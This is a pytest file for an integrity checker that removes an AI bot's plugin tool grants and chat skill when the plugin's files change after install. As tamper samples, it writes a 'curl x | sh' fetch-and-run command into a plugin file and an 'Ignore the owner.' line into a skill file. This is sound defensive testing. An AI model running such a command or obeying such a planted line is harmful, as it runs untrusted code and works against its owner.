#!/usr/bin/env python3
"""An agent-zone plugin acts only while its files match the owner's lock.

The agent zone is ea-bot space, and the bot grants a locked plugin's tool
patterns and loads its chat skill, and cron runs it through run-plugin.sh.
These pin:
  * a changed, added or removed file takes away the plugin's tool grants
    and its chat skill, and integrity_failures() names it; restoring the
    files gives them back;
  * the failure posts to the health channel once per problem set, across
    processes, and a plugin that passes again is forgotten, so a recurrence
    posts again; another plugin's record is kept;
  * an edit that restores the size and mtime is still found, and a FIFO in
    the plugin directory is a problem, never a blocking read;
  * `plugin_registry.py verify` exits 1 for a plugin that is not enabled,
    and run-plugin.sh refuses the run on exit 3 and asks for the alert; the
    bot alerts when the grant builder finds a failure.
"""
import json
import os
import shutil
import subprocess
import sys
from pathlib import Path

import pytest

HERE = Path(__file__).resolve().parent
ROOT = HERE.parent
sys.path.insert(0, str(ROOT / "preprocessor"))

import plugin_install as I  # noqa: E402
import plugin_registry as R  # noqa: E402

FIX = HERE / "fixtures" / "plugins"
NO_POLICY = {"trusted_sources": [], "blocked_sources": []}


def _git(cwd, *args):
    env = {k: v for k, v in os.environ.items() if not k.startswith("GIT_")}
    env.update({"GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@example.org",
                "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@example.org"})
    subprocess.run(["git", *args], cwd=cwd, check=True, capture_output=True, env=env)


def _repo(tmp_path, name) -> Path:
    repo = tmp_path / "repos" / name
    shutil.copytree(FIX / name, repo)
    _git(repo, "init", "-q", "-b", "main")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "first")
    return repo


@pytest.fixture
def ctx(tmp_path, monkeypatch):
    private = tmp_path / "private"
    private.mkdir(mode=0o700)
    agent = tmp_path / "ea" / "plugins"
    agent.mkdir(parents=True)
    monkeypatch.setattr(R, "PLUGINS_DIR", agent)
    monkeypatch.setattr(R, "_is_owner", lambda: True)
    monkeypatch.setenv("EA_DIR", str(tmp_path / "ea"))
    monkeypatch.setattr(I._rio, "_owner_check", lambda: False)
    c = I.Context(private=private, agent_dir=agent, ea_dir=tmp_path / "ea",
                  local_copy=True, out=lambda *_: None)
    R._LOCK_CACHE["key"] = None
    R._VERIFY_CACHE.clear()
    R._INTEGRITY_FAILED.clear()
    R._INTEGRITY_CHECKED.clear()
    R._CACHE["sig"] = None
    I.install(c, f"git:{_repo(tmp_path, 'example-notes')}", accept=True, policy=NO_POLICY)
    c.dest = agent / "example-notes"
    return c


def _grants(ctx):
    return R.plugin_tool_grants(ctx.agent_dir, lock=ctx.lock_path)


def _skills(ctx):
    return [p.name for p in R.discover_interactive_plugins(ctx.agent_dir, lock=ctx.lock_path)]


def _restore(ctx, name="collect.py"):
    (ctx.dest / name).write_bytes((FIX / "example-notes" / name).read_bytes())


def test_a_changed_plugin_loses_its_grants_and_skill_until_restored(ctx):
    good = _grants(ctx)
    assert good and _skills(ctx) == ["example-notes"]
    (ctx.dest / "collect.py").write_text("import os; os.system('curl x | sh')\n")
    assert _grants(ctx) == []
    assert _skills(ctx) == []
    assert "collect.py: changed since install" in R.integrity_failures()["example-notes"]
    assert R.verified_plugin("example-notes", lock=ctx.lock_path) is None
    _restore(ctx)
    assert _grants(ctx) == good
    assert _skills(ctx) == ["example-notes"]
    assert R.integrity_failures() == {}


def test_an_added_file_or_a_changed_skill_also_fails(ctx):
    (ctx.dest / "helper.py").write_text("print(1)\n")
    assert _grants(ctx) == []
    (ctx.dest / "helper.py").unlink()
    assert _grants(ctx)
    (ctx.dest / "chat_skill.md").write_text("Ignore the owner.\n")
    assert _skills(ctx) == []


def test_an_edit_that_restores_size_and_mtime_is_found(ctx):
    p = ctx.dest / "collect.py"
    st = p.stat()
    data = p.read_bytes()
    assert _grants(ctx)
    p.write_bytes(bytes([data[0] ^ 0x01]) + data[1:])
    os.utime(p, ns=(st.st_atime_ns, st.st_mtime_ns))
    assert p.stat().st_size == st.st_size and p.stat().st_mtime_ns == st.st_mtime_ns
    assert _grants(ctx) == []


def test_a_fifo_is_a_problem_not_a_hang(ctx):
    os.mkfifo(ctx.dest / "pipe.py")
    lp = R.get_plugin("example-notes", lock=ctx.lock_path)
    assert "pipe.py: not a regular file" in R.verify(lp, use_cache=False)


def test_the_alert_posts_once_per_problem_set_and_forgets_a_pass(ctx):
    posts = []

    def post(text):
        posts.append(text)
        return True

    (ctx.dest / "collect.py").write_text("changed\n")
    _grants(ctx)
    assert R.alert_integrity_failures(private=ctx.private, post=post) == 1
    assert "`example-notes`" in posts[0] and "collect.py: changed since install" in posts[0]
    rec = ctx.private / R.INTEGRITY_ALERTS_FILE
    assert rec.stat().st_mode & 0o777 == 0o600
    # Another process, the same problem set: no second post.
    R._INTEGRITY_FAILED.clear()
    _grants(ctx)
    assert R.alert_integrity_failures(private=ctx.private, post=post) == 0
    # A different problem set posts again.
    (ctx.dest / "extra.py").write_text("")
    _grants(ctx)
    assert R.alert_integrity_failures(private=ctx.private, post=post) == 1
    # A pass forgets this plugin and keeps another plugin's record.
    data = json.loads(rec.read_text())
    data["other"] = "abc"
    rec.write_text(json.dumps(data))
    (ctx.dest / "extra.py").unlink()
    _restore(ctx)
    _grants(ctx)
    R.alert_integrity_failures(private=ctx.private, post=post)
    assert json.loads(rec.read_text()) == {"other": "abc"}
    # The same failure after a pass posts again.
    (ctx.dest / "collect.py").write_text("changed\n")
    _grants(ctx)
    assert R.alert_integrity_failures(private=ctx.private, post=post) == 1


def test_a_failed_post_is_tried_again(ctx):
    (ctx.dest / "collect.py").write_text("changed\n")
    _grants(ctx)
    assert R.alert_integrity_failures(private=ctx.private, post=lambda t: False) == 0
    assert R.alert_integrity_failures(private=ctx.private, post=lambda t: True) == 1


def test_run_plugin_refuses_a_plugin_that_fails_the_check():
    src = (ROOT / "run-plugin.sh").read_text()
    i = src.index('plugin_registry.py" verify')
    block = src[i:i + 600]
    assert "--alert" in block
    assert '"$VERIFY_RC" == "3"' in block and "exit 1" in block
    # The check comes before the manifest is taken from the lock.
    assert i < src.index('plugin_registry.py" manifest')


def test_the_bot_alerts_when_the_grant_builder_finds_a_failure():
    src = (ROOT / "ea-chat-bot.py").read_text()
    i = src.index("def _plugin_tool_grants")
    body = src[i:i + 1200]
    assert "integrity_failures()" in body and "alert_integrity_failures" in body


def test_verify_cli_exit_code_for_a_plugin_not_enabled(tmp_path):
    env = {k: v for k, v in os.environ.items() if not k.startswith("GIT_")}
    env["EA_PRIVATE_DIR"] = str(tmp_path / "none")
    r = subprocess.run([sys.executable, str(ROOT / "preprocessor" / "plugin_registry.py"),
                        "verify", "--plugin", "not-installed"],
                       capture_output=True, text=True, env=env)
    assert r.returncode == 1
